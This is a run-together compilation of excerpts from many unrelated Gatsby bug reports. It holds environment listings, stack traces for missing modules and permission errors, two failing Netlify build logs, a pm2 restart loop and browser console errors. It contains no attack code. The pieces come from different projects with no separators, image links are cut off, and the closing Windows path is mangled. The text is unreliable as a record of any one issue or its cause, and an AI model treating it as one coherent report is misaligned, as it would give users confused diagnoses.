</summary> ``` system: os: macos 10.15.5 cpu: (8) x64 intel(r) core(tm) i7-7700hq cpu @ 2.80ghz shell: 5.7.1 - /bin/zsh binaries: node: 10.16.0 - ~/.nvm/versions/node/v10.16.0/bin/node yarn: 1.21.1 - ~/.nvm/versions/node/v10.16.0/bin/yarn npm: 6.9.0 - ~/.nvm/versions/node/v10.16.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 83.0.4103.61 firefox: 76.0.1 safari: 13.1.1 npmpackages: gatsby: ^2.22.15 => 2.22.15 gatsby-core-utils: ^1.3.3 => 1.3.3 gatsby-image: ^2.4.5 => 2.4.5 gatsby-link: ^2.4.3 => 2.4.3 gatsby-plugin-catch-links: ^2.3.3 => 2.3.3 gatsby-plugin-feed: ^2.5.3 => 2.5.3 gatsby-plugin-manifest: ^2.4.9 => 2.4.9 gatsby-plugin-mdx: ^1.2.13 => 1.2.13 gatsby-plugin-meta-redirect: ^1.1.1 => 1.1.1 gatsby-plugin-offline: ^3.2.7 => 3.2.7 gatsby-plugin-postcss: ^2.3.2 => 2.3.2 gatsby-plugin-react-helmet: ^3.3.2 => 3.3.2 gatsby-plugin-sharp: ^2.6.9 => 2.6.9 gatsby-plugin-twitter: ^2.3.2 => 2.3.2 gatsby-remark-copy-linked-files: ^2.3.3 => 2.3.3 gatsby-remark-images: ^3.3.8 => 3.3.8 gatsby-remark-prismjs: ^3.5.2 => 3.5.2 gatsby-remark-smartypants: ^2.3.2 => 2.3.2 gatsby-source-filesystem: ^2.3.8 => 2.3.8 gatsby-transformer-remark: ^2.8.13 => 2.8.13 gatsby-transformer-sharp: ^2.5.3 => 2.5.3 npmglobalpackages: gatsby-cli: 2.8.15
</details>
npm audit and npm audit fix leave 5 high severity vulnerabilities, all are related to utils-extend which hasn't been updated in more than 5 years
"error: the result of this staticquery could not be fetched."
node_modules/gatsby/index.d.ts:14:27 - error ts2307: cannot find module './src/bootstrap/load-plugins/types' or its corresponding type declarations
14 import { pluginref } from "./src/bootstrap/load-plugins/types"
``` -> wordpress__wp_v2 fetched : 1 -> wordpress__post fetched : 100 -> wordpress__page fetched : 3 -> wordpress__wp_media fetched : 100 -> wordpress__wp_blocks fetched : 0 -> wordpress__wp_types fetched : 1 -> wordpress__wp_statuses fetched : 1 -> wordpress__wp_taxonomies fetched : 1 -> wordpress__category fetched : 48 -> wordpress__tag fetched : 0 -> wordpress__wp_users fetched : 3
voiceover focus goes to the bottom navigation bar instead, which is the next item visible on the screen.
the actual output is : <noscript><picture><img ..
style="object-fit:cover" /></picture></noscript>
the webp quality is worse.
the source plugin throws an error and the build fails
`"gatsby-source-contentful" threw an error while running the sourcenodes lifecycle: cannot read property \'sys\' of undefined typeerror: cannot read property \'sys\' of undefined - rich-text.js:86 getentrywithfieldlocalesresolved [2po-dgp-front-channel]/[gatsby-source-contentful]/rich-text.js:86:66 - rich-text.js:111 getnormalizedrichtextnode [2po-dgp-front-channel]/[gatsby-source-contentful]/rich-text.js:111:17 - rich-text.js:134 [2po-dgp-front-channel]/[gatsby-source-contentful]/rich-text.js:134:46 - array.map - rich-text.js:134 getnormalizedrichtextnode [2po-dgp-front-channel]/[gatsby-source-contentful]/rich-text.js:134:29 - rich-text.js:159 [2po-dgp-front-channel]/[gatsby-source-contentful]/rich-text.js:159:42 - array.map - rich-text.js:159 getnormalizedrichtextfield [2po-dgp-front-channel]/[gatsby-source-contentful]/rich-text.js:159:30 - normalize.js:354 [2po-dgp-front-channel]/[gatsby-source-contentful]/normalize.js:354:18 - lodash.js:13401 [2po-dgp-front-channel]/[lodash]/lodash.js:13401:38 - lodash.js:4905 [2po-dgp-front-channel]/[lodash]/lodash.js:4905:15 - lodash.js:2990 baseforown [2po-dgp-front-channel]/[lodash]/lodash.js:2990:24 - lodash.js:13400 function.mapvalues [2po-dgp-front-channel]/[lodash]/lodash.js:13400:7 - normalize.js:347 [2po-dgp-front-channel]/[gatsby-source-contentful]/normalize.js:347:33 - array.map - normalize.js:345 [2po-dgp-front-channel]/[gatsby-source-contentful]/normalize.js:345:32 - from previous event: - api-runner-node.js:231 runapi [2po-dgp-front-channel]/[gatsby]/src/utils/api-runner-node.js:231:22 - api-runner-node.js:339 promise.catch.decorateevent.pluginname [2po-dgp-front-channel]/[gatsby]/src/utils/api-runner-node.js:339:17 - from previous event: - api-runner-node.js:338 [2po-dgp-front-channel]/[gatsby]/src/utils/api-runner-node.js:338:14 - timers.js:456 processimmediate internal/timers.js:456:21 - from previous event: - api-runner-node.js:330 [2po-dgp-front-channel]/[gatsby]/src/utils/api-runner-node.js:330:13 - from previous event: - api-runner-node.js:246 apirunner [2po-dgp-front-channel]/[gatsby]/src/utils/api-runner-node.js:246:3 - source-nodes.js:80 module.exports [2po-dgp-front-channel]/[gatsby]/src/utils/source-nodes.js:80:9 - index.js:447 module.exports [2po-dgp-front-channel]/[gatsby]/src/bootstrap/index.js:447:9 - task_queues.js:97 processticksandrejections internal/process/task_queues.js:97:5 - build.js:67 build [2po-dgp-front-channel]/[gatsby]/src/commands/build.js:67:53 not finished source and transform nodes - 1.065s
error throws when starting local dev server.
build fails with `type with name "documentationjscomponentdescription" does not exists` ### proposed solution add a `type documentationjscomponentdescription` with the appropriate fields to the gatsby-node of the plugin: #l47
stack trace: ```
(base) macbook-pro:web $ gatsby develop
/usr/local/lib/node_modules/gatsby-cli/node_modules/yoga-layout-prebuilt/yoga-layout/build/release/nbind.js:53 throw ex; ^ error: cannot find module 'detect-port'
require stack:
- /usr/local/lib/node_modules/gatsby-cli/lib/recipes.js
- /usr/local/lib/node_modules/gatsby-cli/lib/create-cli.js
- /usr/local/lib/node_modules/gatsby-cli/lib/index.js at function.module._resolvefilename (internal/modules/cjs/loader.js:957:15) at function.module._load (internal/modules/cjs/loader.js:840:27) at module.require (internal/modules/cjs/loader.js:1019:19) at require (internal/modules/cjs/helpers.js:77:18) at object.<anonymous> (/usr/local/lib/node_modules/gatsby-cli/lib/recipes.js:18:42) at module._compile (internal/modules/cjs/loader.js:1133:30) at object.module._extensions..js (internal/modules/cjs/loader.js:1153:10) at module.load (internal/modules/cjs/loader.js:977:32) at function.module._load (internal/modules/cjs/loader.js:877:14) at module.require (internal/modules/cjs/loader.js:1019:19) { code: 'module_not_found', requirestack: [ '/usr/local/lib/node_modules/gatsby-cli/lib/recipes.js', '/usr/local/lib/node_modules/gatsby-cli/lib/create-cli.js', '/usr/local/lib/node_modules/gatsby-cli/lib/index.js' ]
/home/alexandre/projects/bestcanais/frontend/node_modules/yoga-layout-prebuilt/yoga-layout/build/release/nbind.js:53 throw ex; ^ error: write eacces at process.target._send (internal/child_process.js:806:20) at process.target.send (internal/child_process.js:677:19) at /home/alexandre/projects/bestcanais/frontend/node_modules/gatsby/node_modules/gatsby-cli/lib/reporter/loggers/ipc/index.js:58:13 at dispatch (/home/alexandre/projects/bestcanais/frontend/node_modules/gatsby/node_modules/gatsby-cli/lib/reporter/redux/index.js:54:5) at /home/alexandre/projects/bestcanais/frontend/node_modules/gatsby/node_modules/gatsby-cli/lib/reporter/redux/internal-actions.js:42:7 at dispatch (/home/alexandre/projects/bestcanais/frontend/node_modules/gatsby/node_modules/gatsby-cli/lib/reporter/redux/index.js:33:5) at /home/alexandre/projects/bestcanais/frontend/node_modules/gatsby/node_modules/gatsby-cli/lib/reporter/redux/index.js:30:28 at array.foreach (<anonymous>) at dispatch (/home/alexandre/projects/bestcanais/frontend/node_modules/gatsby/node_modules/gatsby-cli/lib/reporter/redux/index.js:30:12) at reporter.pendingactivity (/home/alexandre/projects/bestcanais/frontend/node_modules/redux/lib/redux.js:483:12) at module.exports (/home/alexandre/projects/bestcanais/frontend/node_modules/gatsby/dist/commands/develop-process.js:413:21) at object.<anonymous> (/home/alexandre/projects/bestcanais/frontend/.cache/tmp-27267-pdo5cwsb1rys:4:5) at module._compile (internal/modules/cjs/loader.js:1138:30) at object.module._extensions..js (internal/modules/cjs/loader.js:1158:10) at module.load (internal/modules/cjs/loader.js:986:32) at function.module._load (internal/modules/cjs/loader.js:879:14)
emitted 'error' event on process instance at: at processemit [as emit] (/home/alexandre/projects/bestcanais/frontend/node_modules/signal-exit/index.js:161:32) at internal/child_process.js:810:39 at processticksandrejections (internal/process/task_queues.js:79:11) { errno: 'eacces', code: 'eacces', syscall: 'write'
serves on port 9001 but says it's serving on port 9000
development server crashes immediately (before anything really happens, like graphql or page generation)
the following error is displayed: ```
/users/ryo/development/projects/ryosuke-gatsby-blog/node_modules/yoga-layout-prebuilt/yoga-layout/build/release/nbind.js:53 throw ex; ^ error: no valid exports main found for '/users/ryo/development/projects/ryosuke-gatsby-blog/node_modules/@urql/core' at resolveexportstarget (internal/modules/cjs/loader.js:622:9) at applyexports (internal/modules/cjs/loader.js:499:14) at resolveexports (internal/modules/cjs/loader.js:548:12) at function.module._findpath (internal/modules/cjs/loader.js:654:22) at function.module._resolvefilename (internal/modules/cjs/loader.js:953:27) at function.module._load (internal/modules/cjs/loader.js:859:27) at module.require (internal/modules/cjs/loader.js:1028:19) at require (internal/modules/cjs/helpers.js:72:18) at object.<anonymous> (/users/ryo/development/projects/ryosuke-gatsby-blog/node_modules/urql/dist/urql.js:1:12) at module._compile (internal/modules/cjs/loader.js:1139:30) { code: 'module_not_found'
gatsby command not working
3:04:24 pm: build ready to start
3:04:31 pm: build-image version: 30f629161c0736b1a3ecd8b418e5eeffab5c0faf
3:04:31 pm: build-image tag: v3.3.14
3:04:31 pm: buildbot version: 80440c4491d323247b9d55f7bea2ea6bc96ce8d2
3:04:31 pm: fetching cached dependencies
3:04:31 pm: starting to download cache of 254.9kb
3:04:31 pm: finished downloading cache in 83.391613ms
3:04:31 pm: starting to extract cache
3:04:31 pm: failed to fetch cache, continuing with build
3:04:31 pm: starting to prepare the repo for build
3:04:31 pm: no cached dependencies found
cloning fresh repo
3:04:31 pm: git clone
3:04:40 pm: preparing git reference refs/heads/master
3:04:41 pm: starting build script
3:04:41 pm: installing dependencies
3:04:42 pm: v10.20.1 is already installed.
3:04:43 pm: now using node v10.20.1 (npm v6.14.4)
3:04:43 pm: started restoring cached build plugins
3:04:43 pm: finished restoring cached build plugins
3:04:43 pm: attempting ruby version 2.6.2, read from environment
3:04:45 pm: using ruby version 2.6.2
3:04:45 pm: using php version 5.6
3:04:45 pm: 5.2 is already installed.
3:04:45 pm: using swift version 5.2
3:04:45 pm: started restoring cached node modules
3:04:46 pm: finished restoring cached node modules
3:04:47 pm: installing npm modules using npm version 6.14.4
3:05:13 pm: > sharp@0.25.3 install /opt/build/repo/node_modules/sharp
3:05:13 pm: > (node install/libvips && node install/dll-copy && prebuild-install --runtime=napi) || (node-gyp rebuild && node install/dll-copy)
3:05:14 pm: info
3:05:14 pm: sharp
3:05:14 pm: downloading
3:05:15 pm: > core-js@2.6.11 postinstall /opt/build/repo/node_modules/core-js
3:05:15 pm: > node -e "try{require(\'./postinstall\')}catch(e){}"
3:05:16 pm: thank you for using core-js ( ) for polyfilling javascript standard library!
3:05:16 pm: the project needs your help! please consider supporting of core-js on open collective or patreon: 3:05:16 pm: > 3:05:16 pm: > 3:05:16 pm: also, the author of core-js ( ) is looking for a good job -)
3:05:16 pm: > core-js-pure@3.6.5 postinstall /opt/build/repo/node_modules/core-js-pure
3:05:16 pm: > node -e "try{require(\'./postinstall\')}catch(e){}"
3:05:16 pm: > gatsby-telemetry@1.3.5 postinstall /opt/build/repo/node_modules/gatsby-telemetry
3:05:16 pm: > node src/postinstall.js || true
3:05:16 pm: > gatsby-cli@2.12.24 postinstall /opt/build/repo/node_modules/gatsby/node_modules/gatsby-cli
3:05:16 pm: > node scripts/postinstall.js
3:05:16 pm: > gatsby@2.21.37 postinstall /opt/build/repo/node_modules/gatsby
3:05:16 pm: > node scripts/postinstall.js
3:05:18 pm: npm warn optional skipping optional dependency: fsevents@1.2.13 (node_modules/fsevents):
3:05:18 pm: npm warn notsup skipping optional dependency: unsupported platform for fsevents@1.2.13: wanted {"os":"darwin","arch":"any"} (current: {"os":"linux","arch":"x64"})
3:05:18 pm: npm
3:05:18 pm: warn optional skipping optional dependency: fsevents@2.1.3 (node_modules/chokidar/node_modules/fsevents):
3:05:18 pm: npm warn
3:05:18 pm: notsup skipping optional dependency: unsupported platform for fsevents@2.1.3: wanted {"os":"darwin","arch":"any"} (current: {"os":"linux","arch":"x64"})
3:05:18 pm: added 2029 packages from 1118 contributors and audited 2036 packages in 30.937s
3:05:20 pm: 152 packages are looking for funding
3:05:20 pm: run `npm fund` for details
3:05:20 pm: found 0 vulnerabilities
3:05:20 pm: npm modules installed
3:05:20 pm: started restoring cached go cache
3:05:20 pm: finished restoring cached go cache
3:05:20 pm: go version go1.12 linux/amd64
3:05:20 pm: go version go1.12 linux/amd64
3:05:20 pm: installing missing commands
3:05:20 pm: verify run directory
3:05:20 pm: executing user command: gatsby build
3:05:22 pm: success open and validate gatsby-configs - 0.017s
3:05:23 pm: success load plugins - 0.370s
3:05:23 pm: success onpreinit - 0.003s
3:05:23 pm: success delete html and css files from previous builds - 0.030s
3:05:23 pm: info one or more of your plugins have changed since the last time you ran gatsby
3:05:23 pm: a precaution, we're deleting your site's cache to ensure there's no stale data.
3:05:23 pm: success initialize cache - 0.031s
3:05:23 pm: success copy gatsby files - 0.065s
3:05:23 pm: success onprebootstrap - 0.016s
3:05:23 pm: success createschemacustomization - 0.004s
3:05:23 pm: success source and transform nodes - 0.097s
3:05:23 pm: success building schema - 0.273s
3:05:23 pm: success createpages - 0.000s
3:05:23 pm: error you have an empty file in the "src/pages" directory at "src/pages/header.js"
please remove it or make it a valid component
3:05:23 pm: not finished createpagesstatefully - 0.062s
3:05:23 pm: skipping functions preparation step: no functions directory set
3:05:23 pm: caching artifacts
3:05:23 pm: started saving node modules
3:05:23 pm: finished saving node modules
3:05:23 pm: started saving build plugins
3:05:23 pm: finished saving build plugins
3:05:23 pm: started saving pip cache
3:05:29 pm: finished saving pip cache
3:05:29 pm: started saving emacs cask dependencies
3:05:29 pm: finished saving emacs cask dependencies
3:05:29 pm: started saving maven dependencies
3:05:29 pm: finished saving maven dependencies
3:05:29 pm: started saving boot dependencies
3:05:29 pm: finished saving boot dependencies
3:05:29 pm: started saving go dependencies
3:05:29 pm: finished saving go dependencies
3:05:31 pm: error running command: build script returned non-zero exit code: 1
3:05:31 pm: failing build: failed to build site
3:05:32 pm: failed during stage 'building site': build script returned non-zero exit code: 1
3:05:32 pm: finished processing build request in 1m0.81961481s
``` i get deployment error and not sure what is wrong when i just followed the tutorial.
this is my repository.
the gatsby development setup crashed, looking for a file that does exist, but it cannot find because it doesn't look for the filed with extension.
- "old website" links to v14.rileyjshaw.com/404.html
![image](
![screen shot 2020-05-24 at 1 13 11 pm](
it crashed with the following error:
$ gatsby develop
/home/foo/broken-gatsby-develop-command/node_modules/yoga-layout-prebuilt/yoga-layout/build/release/nbind.js:53 throw ex; ^ error: write eacces at process.target._send (internal/child_process.js:762:20) at process.target.send (internal/child_process.js:634:19) at action (/home//foo/broken-gatsby-develop-command/node_modules/gatsby-cli/lib/reporter/loggers/ipc/index.js:58:13) at dispatch (/home//foo/broken-gatsby-develop-command/node_modules/gatsby-cli/lib/reporter/redux/index.js:54:5) at dispatch (/home//foo/broken-gatsby-develop-command/node_modules/gatsby-cli/lib/reporter/redux/internal-actions.js:42:7) at dispatch (/home//foo/broken-gatsby-develop-command/node_modules/gatsby-cli/lib/reporter/redux/index.js:33:5) at action.foreach.item (/home//foo/broken-gatsby-develop-command/node_modules/gatsby-cli/lib/reporter/redux/index.js:30:28) at array.foreach (<anonymous>) at dispatch (/home//foo/broken-gatsby-develop-command/node_modules/gatsby-cli/lib/reporter/redux/index.js:30:12) at reporter.pendingactivity (/home//foo/broken-gatsby-develop-command/node_modules/redux/lib/redux.js:483:12) at module.exports (/home//foo/broken-gatsby-develop-command/node_modules/gatsby/dist/commands/develop-process.js:413:21) at object.<anonymous> (/home//foo/broken-gatsby-develop-command/.cache/tmp-6512-kblw7d8kj2cy:4:5) at module._compile (internal/modules/cjs/loader.js:778:30) at object.module._extensions..js (internal/modules/cjs/loader.js:789:10) at module.load (internal/modules/cjs/loader.js:653:32) at trymoduleload (internal/modules/cjs/loader.js:593:12)
no images appeared
due to the spreading happening here: #l63 the `getnodesbytype` is not passed and so it's missing.
empty strings are returned for both fields.
error #10123 config
this is obtained when building with `rm -rf .cache public && ./node_modules/.bin/gatsby build --prefix-paths` ![image]( the red text is because of a css class that would only be set if the initial value of the setstate were `no_url`
but the shown url is obviously not `no_url`
so the colour and the text contradict each other.
logs look like this over and over again
0|wispyco | success open and validate gatsby-configs - 0.034s
0|wispyco | success load plugins - 0.962s
0|wispyco | success onpreinit - 0.004s
0|wispyco | success delete html and css files from previous builds - 0.016s
0|wispyco | success initialize cache - 0.017s
0|wispyco | success copy gatsby files - 0.034s
0|wispyco | info [sanity] fetching remote graphql schema
0|wispyco | info [sanity] transforming to gatsby-compatible graphql sdl
0|wispyco | warn [sanity] type `sanityassetsourcedata` has field with name `id`, which conflicts with gatsby's
0|wispyco | info [sanity] stitching graphql schemas from sdl
0|wispyco | success onprebootstrap - 0.232s
0|wispyco | success createschemacustomization - 0.005s
0|wispyco | info [sanity] fetching export stream for dataset
0|wispyco | info [sanity] overlaying drafts
0|wispyco | info [sanity] watch mode enabled, starting a listener
0|wispyco | info [sanity] done exporting!
0|wispyco | success source and transform nodes - 0.416s
0|wispyco | warn the type `sanityimageasset` does not explicitly define the field `childimagesharp`.
0|wispyco | on types with the `@dontinfer` directive, or with the `infer` extension set to `false`,
0|wispyco | automatically adding fields for children types is deprecated.
0|wispyco | in gatsby v3, only children fields explicitly set with the `childof` extension will be added.
0|wispyco | success building schema - 0.518s
0|wispyco | success createpages - 0.036s
0|wispyco | success createpagesstatefully - 0.084s
0|wispyco | success onpreextractqueries - 0.003s
0|wispyco | success update schema - 0.033s
0|wispyco | success extract queries from components - 0.712s
0|wispyco | success write out requires - 0.013s
0|wispyco | success write out redirect data - 0.002s
pm2 | change detected on path public/icons/icon-48x48.png for app wispyco - restarting
pm2 | stopping app:wispyco id:0
0|wispyco | not finished onpostbootstrap - 0.103s
pm2 | pid=2420 msg=failed to kill - retrying in 100ms
0|wispyco | not finished build manifest and related icons - 0.106s
pm2 | pid=2420 msg=failed to kill - retrying in 100ms
pm2 | pid=2420 msg=failed to kill - retrying in 100ms
pm2 | app name:wispyco id:0 disconnected
pm2 | app [wispyco:0] exited with code [0] via signal [sigint]
pm2 | pid=2420 msg=process killed
pm2 | app [wispyco:0] starting in -cluster mode-
pm2 | app [wispyco:0] online
0|wispyco | success open and validate gatsby-configs - 0.035s
replaced page with the original context
can't set any bp in `gatsby-node.js`.
12:42:21 pm: build ready to start
12:42:23 pm: build-image version: 30f629161c0736b1a3ecd8b418e5eeffab5c0faf
12:42:23 pm: build-image tag: v3.3.14
12:42:23 pm: buildbot version: df310ca3732a046b9256983a77cdefac8bfb9c05
12:42:24 pm: fetching cached dependencies
12:42:24 pm: starting to download cache of 400.6mb
12:42:33 pm: finished downloading cache in 9.417560942s
12:42:33 pm: starting to extract cache
12:42:52 pm: finished extracting cache in 18.894923926s
12:42:52 pm: finished fetching cache in 28.42617449s
12:42:52 pm: starting to prepare the repo for build
12:42:53 pm: preparing git reference refs/heads/master
12:42:54 pm: starting build script
12:42:54 pm: installing dependencies
12:42:55 pm: started restoring cached node version
12:43:00 pm: finished restoring cached node version
12:43:01 pm: v10.20.1 is already installed.
12:43:02 pm: now using node v10.20.1 (npm v6.14.4)
12:43:02 pm: started restoring cached build plugins
12:43:02 pm: finished restoring cached build plugins
12:43:02 pm: attempting ruby version 2.6.2, read from environment
12:43:03 pm: using ruby version 2.6.2
12:43:04 pm: using php version 5.6
12:43:04 pm: 5.2 is already installed.
12:43:04 pm: using swift version 5.2
12:43:04 pm: started restoring cached node modules
12:43:04 pm: finished restoring cached node modules
12:43:04 pm: started restoring cached yarn cache
12:43:04 pm: finished restoring cached yarn cache
12:43:05 pm: installing npm modules using yarn version 1.17.0
12:43:06 pm: yarn install v1.17.0
12:43:06 pm: [1/4] resolving packages...
12:43:08 pm: warning gatsby-source-strapi > gatsby-source-filesystem > chokidar@1.7.0: chokidar 2 will break on node v14+
upgrade to chokidar 3 with 15x less dependencies.
12:43:09 pm: warning gatsby-source-strapi > gatsby-source-filesystem > babel-cli > chokidar@1.7.0: chokidar 2 will break on node v14+
upgrade to chokidar 3 with 15x less dependencies.
12:43:09 pm: warning gatsby-source-strapi > gatsby-source-filesystem > chokidar > fsevents@1.2.13: fsevents 1 will break on node v14+ and could be using insecure binaries
upgrade to fsevents 2.
12:43:09 pm: warning gatsby-source-strapi > gatsby-source-filesystem > babel-cli > babel-polyfill > core-js@2.6.11: core-js@<3 is no longer maintained and not recommended for usage due to the number of issues
please, upgrade your dependencies to the actual version of core-js@3.
12:43:09 pm: warning gatsby-source-strapi > gatsby-source-filesystem > babel-cli > babel-register > core-js@2.6.11: core-js@<3 is no longer maintained and not recommended for usage due to the number of issues
please, upgrade your dependencies to the actual version of core-js@3.
12:43:09 pm: warning node-sass > request@2.88.2: request has been deprecated, see
12:43:09 pm: warning node-sass > node-gyp > request@2.88.2: request has been deprecated, see
12:43:11 pm: [2/4] fetching packages...
12:43:37 pm: info fsevents@2.1.2: the platform "linux" is incompatible with this module.
12:43:37 pm: info "fsevents@2.1.2" is an optional dependency and failed compatibility check
excluding it from installation.
12:43:37 pm: info fsevents@1.2.11: the platform "linux" is incompatible with this module.
12:43:37 pm: info "fsevents@1.2.11" is an optional dependency and failed compatibility check
excluding it from installation.
12:43:37 pm: info fsevents@1.2.13: the platform "linux" is incompatible with this module.
12:43:37 pm: info "fsevents@1.2.13" is an optional dependency and failed compatibility check
excluding it from installation.
12:43:37 pm: [3/4] linking dependencies...
12:43:37 pm: warning "gatsby > react-hot-loader@4.12.19" has unmet peer dependency "@types/react@^15.0.0 || ^16.0.0".
12:43:37 pm: warning "gatsby > @typescript-eslint/eslint-plugin > tsutils@3.17.1" has unmet peer dependency "typescript@>=2.8.0 || >= 3.2.0-dev || >= 3.3.0-dev || >= 3.4.0-dev || >= 3.5.0-dev || >= 3.6.0-dev || >= 3.6.0-beta || >= 3.7.0-dev || >= 3.7.0-beta".
12:43:37 pm: warning "gatsby > gatsby-cli > ink@2.6.0" has unmet peer dependency "@types/react@>=16.8.0".
12:43:37 pm: warning "gatsby-plugin-sass > sass-loader@7.3.1" has unmet peer dependency "webpack@^3.0.0 || ^4.0.0".
12:43:37 pm: warning "gatsby-source-strapi > gatsby-source-filesystem@1.5.39" has incorrect peer dependency "gatsby@^1.9.250".
12:43:37 pm: warning " > eslint-loader@4.0.2" has unmet peer dependency "webpack@^4.0.0 || ^5.0.0".
12:43:37 pm: warning " > gatsby-plugin-eslint@2.0.8" has incorrect peer dependency "eslint-loader@^3.0.2".
12:43:55 pm: [4/4] building fresh packages...
12:44:01 pm: success saved lockfile.
12:44:01 pm: done in 55.13s.
12:44:01 pm: npm modules installed using yarn
12:44:01 pm: started restoring cached go cache
12:44:01 pm: finished restoring cached go cache
12:44:01 pm: go version go1.12 linux/amd64
12:44:01 pm: go version go1.12 linux/amd64
12:44:01 pm: installing missing commands
12:44:01 pm: verify run directory
12:44:01 pm: executing user command: gatsby build
12:44:04 pm: success open and validate gatsby-configs - 0.029s
12:44:05 pm: success load plugins - 0.905s
12:44:05 pm: success onpreinit - 0.003s
12:44:05 pm: success delete html and css files from previous builds - 0.015s
12:44:05 pm: success initialize cache - 0.010s
12:44:05 pm: success copy gatsby files - 0.040s
12:44:05 pm: success onprebootstrap - 0.010s
12:44:05 pm: success createschemacustomization - 0.004s
12:44:05 pm: info starting to fetch data from strapi -
12:44:05 pm: info starting to fetch data from strapi -
12:44:05 pm: info starting to fetch data from strapi -
12:44:05 pm: info starting to fetch data from strapi -
12:44:05 pm: info starting to fetch data from strapi -
12:44:05 pm: info starting to fetch data from strapi -
12:44:05 pm: info starting to fetch data from strapi -
12:44:05 pm: info starting to fetch data from strapi -
12:44:05 pm: info starting to fetch data from strapi -
12:44:05 pm: info starting to fetch data from strapi -
12:44:05 pm: info starting to fetch data from strapi -
12:44:05 pm: info starting to fetch data from strapi -
12:44:05 pm: info starting to fetch data from strapi -
12:44:05 pm: info starting to fetch data from strapi -
12:44:07 pm: success fetched strapi data - 1.500s
12:44:07 pm: success source and transform nodes - 1.753s
12:44:07 pm: warning multiple node fields resolve to the same graphql field `strapiprivacypolicy.seo.image` - [`image`, `image___node`]
gatsby will use `image___node`.
12:44:07 pm: warning multiple node fields resolve to the same graphql field `strapirequestacourse.how_it_works.icon` - [`icon`, `icon___node`]
gatsby will use `icon___node`.
12:44:07 pm: warning multiple node fields resolve to the same graphql field `strapirequestacourse.seo.image` - [`image`, `image___node`]
gatsby will use `image___node`.
12:44:07 pm: warning multiple node fields resolve to the same graphql field `strapirequestacourse.image` - [`image`, `image___node`]
gatsby will use `image___node`.
12:44:07 pm: warning multiple node fields resolve to the same graphql field `strapiblogpage.seo.image` - [`image`, `image___node`]
gatsby will use `image___node`.
12:44:07 pm: warning multiple node fields resolve to the same graphql field `strapiresourcespage.seo.image` - [`image`, `image___node`]
gatsby will use `image___node`.
12:44:07 pm: warning multiple node fields resolve to the same graphql field `strapiabout.seo.image` - [`image`, `image___node`]
gatsby will use `image___node`.
12:44:07 pm: warning multiple node fields resolve to the same graphql field `strapiabout.image` - [`image`, `image___node`]
gatsby will use `image___node`.
12:44:07 pm: warning multiple node fields resolve to the same graphql field `strapicontactus.seo.image` - [`image`, `image___node`]
gatsby will use `image___node`.
12:44:07 pm: warning multiple node fields resolve to the same graphql field `strapihomepage.how_it_works.icon` - [`icon`, `icon___node`]
gatsby will use `icon___node`.
12:44:07 pm: warning multiple node fields resolve to the same graphql field `strapihomepage.seo.image` - [`image`, `image___node`]
gatsby will use `image___node`.
12:44:07 pm: warning multiple node fields resolve to the same graphql field `strapicourses.course_topic.seo.image` - [`image`, `image___node`]
gatsby will use `image___node`.
12:44:07 pm: warning multiple node fields resolve to the same graphql field `strapicourses.course_topic.image` - [`image`, `image___node`]
gatsby will use `image___node`.
12:44:07 pm: warning multiple node fields resolve to the same graphql field `strapicourses.seo.image` - [`image`, `image___node`]
gatsby will use `image___node`.
12:44:07 pm: warning multiple node fields resolve to the same graphql field `strapicourses.header_image` - [`header_image`, `header_image___node`]
gatsby will use `header_image___node`.
12:44:07 pm: warning multiple node fields resolve to the same graphql field `strapicoursebookings.course.seo.image` - [`image`, `image___node`]
gatsby will use `image___node`.
12:44:07 pm: warning multiple node fields resolve to the same graphql field `strapicoursebookings.course.header_image` - [`header_image`, `header_image___node`]
gatsby will use `header_image___node`.
12:44:07 pm: warning multiple node fields resolve to the same graphql field `strapicoursetopics.seo.image` - [`image`, `image___node`]
gatsby will use `image___node`.
12:44:07 pm: warning multiple node fields resolve to the same graphql field `strapicoursetopics.image` - [`image`, `image___node`]
gatsby will use `image___node`.
12:44:07 pm: warning multiple node fields resolve to the same graphql field `strapiblogarticles.section.image` - [`image`, `image___node`]
gatsby will use `image___node`.
12:44:07 pm: warning multiple node fields resolve to the same graphql field `strapiblogarticles.seo.image` - [`image`, `image___node`]
gatsby will use `image___node`.
12:44:07 pm: warning multiple node fields resolve to the same graphql field `strapiblogarticles.cover` - [`cover`, `cover___node`]
gatsby will use `cover___node`.
12:44:08 pm: success building schema - 0.900s
12:44:08 pm: success createpages - 0.071s
12:44:08 pm: success createpagesstatefully - 0.100s
12:44:08 pm: success onpreextractqueries - 0.000s
12:44:08 pm: success update schema - 0.041s
12:44:09 pm: error there was a problem parsing the graphql query in file: /opt/build/repo/node_modules/gatsby-recipes/src/index.js
12:44:09 pm: failed extract queries from components - 1.117s
12:44:09 pm: skipping functions preparation step: no functions directory set
12:44:09 pm: caching artifacts
12:44:09 pm: started saving node modules
12:44:09 pm: finished saving node modules
12:44:09 pm: started saving build plugins
12:44:09 pm: finished saving build plugins
12:44:09 pm: started saving yarn cache
12:44:09 pm: finished saving yarn cache
12:44:09 pm: started saving pip cache
12:44:18 pm: finished saving pip cache
12:44:18 pm: started saving emacs cask dependencies
12:44:18 pm: finished saving emacs cask dependencies
12:44:18 pm: started saving maven dependencies
12:44:18 pm: finished saving maven dependencies
12:44:18 pm: started saving boot dependencies
12:44:18 pm: finished saving boot dependencies
12:44:18 pm: started saving go dependencies
12:44:18 pm: finished saving go dependencies
12:44:18 pm: error running command: build script returned non-zero exit code: 1
12:44:18 pm: failing build: failed to build site
12:44:18 pm: failed during stage 'building site': build script returned non-zero exit code: 1
12:44:18 pm: finished processing build request in 1m54.69586124s
<style data-styled data-styled-version="5.1.0">
/* only a fraction of the css appears, only the one from static css files imported
``` ![styled-components-5 1 0](
the plugin breaks in gatsby-plugin-mdx's `inference-metadata.js` with the message `typeerror: cannot set property 'dirty' of undefined`
#### _===> firefox_
i get these errors
`the connection to was interrupted while the page was loading.`
`syntaxerror: expected expression, got '<'` ![img]( #### _===> chrome_
the browser keeps reloading non-stop, and it shows some errors on the console but i couldn't read all of them
here are some errors that i could get by stopping the refresh
`uncaught (in promise) error: manifest request to /9e7b27f5efbfea19e53d.hot-update.json timed out
at xmlhttprequest.request.onreadystatechange (bootstrap:41)` ![img]( `global-shortcut.js:10 uncaught typeerror: cannot read property 'hasattribute' of null at global-shortcut.js:10 at global-shortcut.js:10` ![img](
c:\\users\ euiqh\\appdata\ oaming\ pm\ ode_modules\\gatsby-cli\ ode_modules\\yoga-layout-prebuilt\\yoga-layout\\build\ elease\ bind.js:53 throw ex; ^ error: cannot find module 'detect-port'
require stack:
